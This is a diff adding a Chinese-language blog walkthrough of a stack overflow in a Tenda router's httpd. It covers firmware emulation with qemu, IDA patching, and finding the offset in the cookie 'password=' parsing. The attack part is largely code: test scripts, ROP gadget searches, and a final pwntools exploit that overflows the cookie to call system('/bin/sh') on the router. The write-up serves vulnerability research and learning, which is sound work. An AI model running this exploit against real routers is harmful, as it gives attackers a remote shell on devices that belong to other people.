@@ -15,12 +15,69 @@
 <meta property="og:site_name" content="ZhouYetao">
 <meta property="og:description" content="tenda路由器的httpd存在了栈溢出的漏洞，利用这个漏洞可以覆盖返回地址，成功getshell。">
 <meta property="og:locale">
+<meta property="og:image" content="http://example.com/images/pasted-42.png">
+<meta property="og:image" content="http://example.com/images/pasted-43.png">
+<meta property="og:image" content="http://example.com/images/pasted-44.png">
+<meta property="og:image" content="http://example.com/images/pasted-45.png">
+<meta property="og:image" content="http://example.com/images/pasted-46.png">
+<meta property="og:image" content="http://example.com/images/pasted-47.png">
+<meta property="og:image" content="http://example.com/images/pasted-48.png">
+<meta property="og:image" content="http://example.com/images/pasted-49.png">
+<meta property="og:image" content="http://example.com/images/pasted-50.png">
+<meta property="og:image" content="http://example.com/images/pasted-51.png">
+<meta property="og:image" content="http://example.com/images/pasted-52.png">
+<meta property="og:image" content="http://example.com/images/pasted-53.png">
+<meta property="og:image" content="http://example.com/images/pasted-54.png">
+<meta property="og:image" content="http://example.com/images/pasted-55.png">
+<meta property="og:image" content="http://example.com/images/pasted-56.png">
+<meta property="og:image" content="http://example.com/images/pasted-57.png">
+<meta property="og:image" content="http://example.com/images/pasted-58.png">
+<meta property="og:image" content="http://example.com/images/pasted-59.png">
+<meta property="og:image" content="http://example.com/images/pasted-60.png">
+<meta property="og:image" content="http://example.com/images/pasted-61.png">
+<meta property="og:image" content="http://example.com/images/pasted-63.png">
+<meta property="og:image" content="http://example.com/images/pasted-64.png">
+<meta property="og:image" content="http://example.com/images/pasted-65.png">
+<meta property="og:image" content="http://example.com/images/pasted-66.png">
+<meta property="og:image" content="http://example.com/images/pasted-67.png">
+<meta property="og:image" content="http://example.com/images/pasted-68.png">
+<meta property="og:image" content="http://example.com/images/pasted-69.png">
+<meta property="og:image" content="http://example.com/images/pasted-70.png">
+<meta property="og:image" content="http://example.com/images/pasted-71.png">
+<meta property="og:image" content="http://example.com/images/pasted-72.png">
+<meta property="og:image" content="http://example.com/images/pasted-73.png">
+<meta property="og:image" content="http://example.com/images/pasted-74.png">
+<meta property="og:image" content="http://example.com/images/pasted-75.png">
+<meta property="og:image" content="http://example.com/images/pasted-77.png">
+<meta property="og:image" content="http://example.com/images/pasted-79.png">
+<meta property="og:image" content="http://example.com/images/pasted-80.png">
+<meta property="og:image" content="http://example.com/images/pasted-81.png">
+<meta property="og:image" content="http://example.com/images/pasted-82.png">
+<meta property="og:image" content="http://example.com/images/pasted-83.png">
+<meta property="og:image" content="http://example.com/images/pasted-84.png">
+<meta property="og:image" content="http://example.com/images/pasted-85.png">
+<meta property="og:image" content="http://example.com/images/pasted-87.png">
+<meta property="og:image" content="http://example.com/images/pasted-88.png">
+<meta property="og:image" content="http://example.com/images/pasted-89.png">
+<meta property="og:image" content="http://example.com/images/pasted-90.png">
+<meta property="og:image" content="http://example.com/images/pasted-91.png">
+<meta property="og:image" content="http://example.com/images/pasted-92.png">
+<meta property="og:image" content="http://example.com/images/pasted-93.png">
+<meta property="og:image" content="http://example.com/images/pasted-94.png">
+<meta property="og:image" content="http://example.com/images/pasted-95.png">
+<meta property="og:image" content="http://example.com/images/pasted-96.png">
+<meta property="og:image" content="http://example.com/images/pasted-97.png">
+<meta property="og:image" content="http://example.com/images/pasted-100.png">
+<meta property="og:image" content="http://example.com/images/pasted-98.png">
+<meta property="og:image" content="http://example.com/images/pasted-99.png">
+<meta property="og:image" content="http://example.com/images/pasted-101.png">
 <meta property="article:published_time" content="2021-09-16T10:33:00.000Z">
-<meta property="article:modified_time" content="2021-09-16T10:41:50.452Z">
+<meta property="article:modified_time" content="2021-09-17T08:16:30.711Z">
 <meta property="article:author" content="ZhouYetao">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="iot">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/pasted-42.png">
   
     <link rel="alternative" href="/atom.xml" title="ZhouYetao" type="application/atom+xml">
   
@@ -182,33 +239,159 @@
 <h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>本人环境为Ubuntu20.04，需要安装qemu、binwalk、gdb、gdb-multiarch等工具，具体的安装方法较为简单就不一一赘述。</p>
 <h4 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h4><h5 id="binwalk分离固件"><a href="#binwalk分离固件" class="headerlink" title="binwalk分离固件"></a>binwalk分离固件</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me xxxx.bin</span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/pasted-42.png" alt="upload successful"></p>
+<p>随后cd进入squashfs-root目录：</p>
+<p><img src="/images/pasted-43.png" alt="upload successful"></p>
+<p>这个时候需要进行的操作是将webroot_ro中的内容全部复制到webroot中，或者可以和我一样，删除webroot，将webroot_ro重命名为webroot：</p>
+<p><img src="/images/pasted-44.png" alt="upload successful"></p>
+<h5 id="httpd逆向分析以及挂载"><a href="#httpd逆向分析以及挂载" class="headerlink" title="httpd逆向分析以及挂载"></a>httpd逆向分析以及挂载</h5><p>接下去就是对bin中的httpd进行挂载和逆向分析。这边挂载使用到的是qemu和chroot命令。</p>
+<p>首先安装qemu和arm的动态链接库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*</span><br><span class="line">cp $(which qemu-arm-static) .</span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/pasted-45.png" alt="upload successful"></p>
+<p>随后开始挂载：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/pasted-46.png" alt="upload successful"></p>
+<p>初次挂载遇到的情况，既然无法创建，那我们就手动创建：</p>
+<p><img src="/images/pasted-47.png" alt="upload successful"></p>
+<p>创建完之后再次挂载：</p>
+<p><img src="/images/pasted-48.png" alt="upload successful"></p>
+<p>但是还是没法成功挂载，将httpd拖入IDA中进行逆向分析，打开程序之后shift+f12输出字符串，alt+t搜索“welovelinux”：</p>
+<p><img src="/images/pasted-49.png" alt="upload successful"></p>
+<p><img src="/images/pasted-50.png" alt="upload successful"></p>
+<p>双击该字符串跳转，ctrl+x交叉引用，鼠标双击第一行：</p>
+<p><img src="/images/pasted-51.png" alt="upload successful"></p>
+<p>成功跳转至graph界面：</p>
+<p><img src="/images/pasted-52.png" alt="upload successful"></p>
+<p>根据流程图进行分析，发现会对网络环境进行check，也就是check_network函数：</p>
+<p><img src="/images/pasted-53.png" alt="upload successful"></p>
+<p>对汇编进行分析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">loc_2CF84</span><br><span class="line">SUB             R3, R11, #-var_B4</span><br><span class="line">MOV             R0, R3</span><br><span class="line">BL              check_network</span><br><span class="line">MOV             R3, R0</span><br><span class="line">CMP             R3, #0 ------&gt; 将R3与0进行比较</span><br><span class="line">BGT             loc_2CFA8 ---&gt; 如果上句结果大于等于0则跳转</span><br></pre></td></tr></table></figure>
+<p>BGT命令的含义为branch if greater than，可以理解为大于等于则跳转。既然如此，那就直接将R3赋值为1，这样可以强制跳转，对程序进行patch：</p>
+<p><img src="/images/pasted-54.png" alt="upload successful"></p>
+<p>我的IDA已经安装了keypatch插件，可以利用该插件直接进行patch，如果没有安装插件的也可以通过IDA自带的patch功能进行patch：</p>
+<p><img src="/images/pasted-55.png" alt="upload successful"></p>
+<p>进行patch：</p>
+<p><img src="/images/pasted-56.png" alt="upload successful"></p>
+<p>继续跟随进入下一个函数，发现还有一个判断，相同操作进行patch：</p>
+<p><img src="/images/pasted-57.png" alt="upload successful"></p>
+<p>patch完成。对于http来说，他还调用了alarm函数：</p>
+<p><img src="/images/pasted-58.png" alt="upload successful"></p>
+<p>交叉引用查看在什么地方调用了alarm函数：</p>
+<p><img src="/images/pasted-59.png" alt="upload successful"></p>
+<p>发现在两处调用了alarm函数：</p>
+<p><img src="/images/pasted-60.png" alt="upload successful"></p>
+<p>发现这边的alarm中的参数为0x3c，这里选择将其patch为0，因为alarm(0)就等于不调用alarm函数，具体的可以参照linux中对于alarm函数的定义，采用相同操作对两处alarm进行patch：</p>
+<p><img src="/images/pasted-61.png" alt="upload successful"></p>
+<p>这里要注意的一点是要将分号后面的删干净，不然会出错，如图修改：</p>
+<p><img src="/images/pasted-63.png" alt="upload successful"></p>
+<p>patch完成之后，对程序进行保存：</p>
+<p><img src="/images/pasted-64.png" alt="upload successful"></p>
+<p>随后将httpd替换bin中的httpd，替换了之后，一定要记得chmod赋予运行的权限，我习惯命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x *</span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/pasted-65.png" alt="upload successful"></p>
+<p>发现已经可以成功挂载起来：</p>
+<p><img src="/images/pasted-66.png" alt="upload successful"></p>
+<p>初次运行，这边的ip会是一个随机的ip，需要对网桥进行设置：</p>
+<p><img src="/images/pasted-67.png" alt="upload successful"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 eth0</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo dhclient br0</span><br></pre></td></tr></table></figure>
+<p>我的Ubuntu虚拟机一开始并没有eth0这个网卡，具体的可以ifconfig查看，我选择的是将原有的ens33改名为eth0，具体的修改方法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/default/grub</span><br><span class="line">找到GRUB_CMDLINE_LINUX这一行，将该行注释</span><br><span class="line">在下面添加:</span><br><span class="line">GRUB_CMDLINE_LINUX=&quot;net.ifnames=0 biosdevname=0&quot;</span><br><span class="line">保存之后退出</span><br><span class="line">sudo grub-mkconfig -o /boot/grub/grub.cfg</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/pasted-68.png" alt="upload successful"></p>
+<p>重启之后进行ifconfig查看之后，发现已经成功更改：</p>
+<p><img src="/images/pasted-69.png" alt="upload successful"></p>
+<p>再进行上述网桥创建工作，成功之后，ifconfig结果会出现br0：</p>
+<p><img src="/images/pasted-70.png" alt="upload successful"></p>
+<p>随后进行挂载，ip就是本机的ip了：</p>
+<p><img src="/images/pasted-71.png" alt="upload successful"></p>
+<p>为了验证是否成功挂载，可以在浏览器中输入ip，来验证（前提是挂载的端口为80端口，否则需要在ip后面添加相应的端口）：</p>
+<p><img src="/images/pasted-72.png" alt="upload successful"></p>
+<p>成功挂载。</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="函数R7WebsSecurityHandler分析"><a href="#函数R7WebsSecurityHandler分析" class="headerlink" title="函数R7WebsSecurityHandler分析"></a>函数R7WebsSecurityHandler分析</h5><p><img src="/images/pasted-73.png" alt="upload successful"></p>
+<p>按tab进行反汇编查看，这样查看能更直观发现漏洞点：</p>
+<p><img src="/images/pasted-74.png" alt="upload successful"></p>
+<p>函数首先会寻找“password=”的位置，然后通过正则表达式解析“=”到“；”之间的内容，其他并没有做任何的过滤，经典的栈溢出漏洞。</p>
+<h5 id="函数条件分析"><a href="#函数条件分析" class="headerlink" title="函数条件分析"></a>函数条件分析</h5><p>找到了漏洞函数之后，开始分析怎么才可以到达栈溢出函数，先对之前的条件进行分析，要让条件能够到达栈溢出函数处：</p>
+<p><img src="/images/pasted-75.png" alt="upload successful"></p>
+<p>发现这里采用了strncmp进行比较，这个就是一个问题函数，很好绕过，只要输入ascii码大于被比较字符串即可，先写一个程序进行验证，程序源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()//gcc -o test test.c</span><br><span class="line">&#123;</span><br><span class="line">    if(strncmp(&quot;xxx&quot;,&quot;aaa&quot;,3))</span><br><span class="line">    &#123;</span><br><span class="line">        puts(&quot;right&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>运行结果如下：</p>
+<p><img src="/images/pasted-77.png" alt="upload successful"></p>
+<p>发现成功绕过该函数。</p>
+<p>所以在上述函数中，要绕过该if，只需要构造url让判断大于0即可，可以采用ascii大于被比较字符串即可，构造url：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http://192.168.5.3/goform/zzz&quot;</span><br></pre></td></tr></table></figure>
+<p>这边利用zzz的原因是在数字字母中，ascii最大，肯定可以绕过判断。</p>
+<h5 id="动态调试得到偏移字符"><a href="#动态调试得到偏移字符" class="headerlink" title="动态调试得到偏移字符"></a>动态调试得到偏移字符</h5><p>这边动态调试使用的是gdb-multiarch，在调试之前，要将挂载的添加调试端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 2333 ./bin/httpd</span><br></pre></td></tr></table></figure>
+<p>随后使用gdb-multiarch加载httpd，并监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -q ./bin/httpd</span><br><span class="line">target remote :2333</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/pasted-79.png" alt="upload successful"></p>
+<p><img src="/images/pasted-80.png" alt="upload successful"></p>
+<p>这样属于成功加载动态调试。</p>
+<p>编辑栈溢出测试exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://192.168.5.3/goform/xxx&quot;</span><br><span class="line">cookie = &#123;&quot;Cookie&quot;:&quot;password=&quot;+&quot;A&quot;*1000&#125;</span><br><span class="line">requests.get(url=url, cookies=cookie)</span><br></pre></td></tr></table></figure>
+<p>运行exp：</p>
+<p><img src="/images/pasted-81.png" alt="upload successful"></p>
+<p>发现程序并没有和预想中一样崩溃，输入bt命令查看被什么函数逼停：</p>
+<p><img src="/images/pasted-82.png" alt="upload successful"></p>
+<p>发现被0x0002c5cc给截停，先找到该位置：</p>
+<p><img src="/images/pasted-83.png" alt="upload successful"></p>
+<p>交叉引用得到调用该函数的位置，为了更好地分辨，我将这个函数重命名为wait。</p>
+<p><img src="/images/pasted-84.png" alt="upload successful"></p>
+<p>发现调用该函数的位置都在漏洞函数中，跳转到漏洞函数继续进行分析：</p>
+<p><img src="/images/pasted-85.png" alt="upload successful"></p>
+<p>发现是在均在label中调用该函数，分析第一个label，发现该label均在该函数中被跳转：</p>
+<p><img src="/images/pasted-87.png" alt="upload successful"></p>
+<p>分析这个if，发现这个if是在寻找“.”的位置，随后对后面的字符串进行比较，如果是符合gif、png、js、css、jpg、jpeg就会跳出这个if，也就不会加载到wait函数，修改exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://192.168.5.3/goform/xxx&quot;</span><br><span class="line">cookie = &#123;&quot;Cookie&quot;:&quot;password=&quot;+&quot;A&quot;*1000+&quot;.gif&quot;&#125;</span><br><span class="line">requests.get(url=url, cookies=cookie)</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<p><img src="/images/pasted-88.png" alt="upload successful"></p>
+<p>程序不出所料被覆盖了return地址，接下来就是寻找偏移地址了，这边有两种办法寻找：</p>
+<h6 id="第一种，直接在IDA中查看："><a href="#第一种，直接在IDA中查看：" class="headerlink" title="第一种，直接在IDA中查看："></a>第一种，直接在IDA中查看：</h6><p><img src="/images/pasted-89.png" alt="upload successful"></p>
+<p>偏移地址即为距离bp的距离，即为0x1c0（448）</p>
+<h6 id="第二种使用cyclic进行调试"><a href="#第二种使用cyclic进行调试" class="headerlink" title="第二种使用cyclic进行调试"></a>第二种使用cyclic进行调试</h6><p>不过这种方法需要修改调试的脚本，首先利用pwndbg的插件cyclic生成字符串，这边生成的是长度为1000的字符串：</p>
+<p><img src="/images/pasted-90.png" alt="upload successful"></p>
+<p>生成了字符串之后，将其复制到脚本中，修改exp为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://192.168.5.3/goform/xxx&quot;</span><br><span class="line">cookie = &#123;&quot;Cookie&quot;:&quot;password=&quot;+&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae&quot;+ &quot;.png&quot;&#125;</span><br><span class="line">requests.get(url=url, cookies=cookie)</span><br></pre></td></tr></table></figure>
+<p>重新根据上述步骤进行动态调试：</p>
+<p><img src="/images/pasted-91.png" alt="upload successful"></p>
+<p>查找偏移：</p>
+<p><img src="/images/pasted-92.png" alt="upload successful"></p>
+<p><img src="/images/pasted-93.png" alt="upload successful"></p>
+<p>但是这边发现跟第一个方法算出来的不一样，这里涉及到ARM模式(LSB=0)和Thumb模式(LSB=1)的切换，需要查看寄存器cpsr的值，并观察T位是否为0</p>
+<p><img src="/images/pasted-94.png" alt="upload successful"></p>
+<p>需要查看寄存器cpsr的值，并观察T位是否为0：</p>
+<p><img src="/images/pasted-95.png" alt="upload successful"></p>
+<p>果不其然T被置为了1，所以函数的返回地址被减去了1，也就是说返回地址的偏移应该为0x6561616d，再次查看偏移：</p>
+<p><img src="/images/pasted-96.png" alt="upload successful"></p>
+<p>与第一种方法获得的一致。</p>
+<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>得到了偏移之后，接下去的方法就和普通的栈溢出一致，这边采用了ROP的方式进行getshell。这边为了便于分析，直接关闭了aslr：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure>
+<p>这样每一次的地址都不会发生改变，下一步获取libc的基址，这边采用查看got表地址，减去在libc中的偏移获得libc的基址，打开动态调试，构造栈溢出之后，输入info functions：</p>
+<p><img src="/images/pasted-97.png" alt="upload successful"></p>
+<p><img src="/images/pasted-100.png" alt="upload successful"></p>
+<p>获得system的got表地址，减去在libc中的偏移，就可以获得libc基址。</p>
+<p>在这边还需要构造两个gadget，分别用来改变返回函数，和返回函数中的参数。</p>
+<p>第一个gadget，需要找到一个写入sp，这样能将指令写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary &quot;./squashfs-root/lib/libc.so.0&quot; --only  &quot;mov|blx&quot; | grep sp</span><br><span class="line">#0x00040cb8 : mov r0, sp ; blx r3</span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/pasted-98.png" alt="upload successful"></p>
+<p>接下去需要寻找一个可以写r3的gadget：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary &quot;./squashfs-root/lib/libc.so.0&quot; --only  &quot;pop&quot; | grep r3</span><br><span class="line">#0x00018298 : pop &#123;r3, pc&#125;</span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/pasted-99.png" alt="upload successful"></p>
+<p>至此，一条rop链已经形成完毕：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">溢出 -&gt; (pop &#123;r3, pc&#125;) -&gt; system -&gt; (mov r0, sp ; blx r3) -&gt; binsh</span><br></pre></td></tr></table></figure>
+<p>给出最后的exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">cmd=&quot;/bin/sh&quot;</span><br><span class="line">libc = ELF(&quot;./libc.so.0&quot;)</span><br><span class="line">system_addr = 0xff62f270</span><br><span class="line">libc_base = system_addr - libc.sym[&quot;system&quot;]#0xff5d5000#0xff5c6000</span><br><span class="line">system_offset = 0x0005a270</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">log.success(&quot;0x%x&quot;,system_addr)</span><br><span class="line">gadget1 = libc_base + 0x00018298</span><br><span class="line">gadget2 = libc_base + 0x00040cb8</span><br><span class="line">payload = &quot;A&quot;*444 +&quot;.png&quot; + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd</span><br><span class="line">url = &quot;http://192.168.5.3/goform/zzz&quot;</span><br><span class="line">cookie = &#123;&quot;Cookie&quot;:&quot;password=&quot;+payload&#125;</span><br><span class="line">log.success(&quot;getshell&quot;)</span><br><span class="line">requests.get(url=url, cookies=cookie)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<p><img src="/images/pasted-101.png" alt="upload successful"></p>
+<p>最后getshell成功。</p>
 
       
 
@@ -481,15 +664,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">iot</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">fmt</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">stackoverflow</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">iot</a>
               </li>
             
             <div class="clearfix"></div>
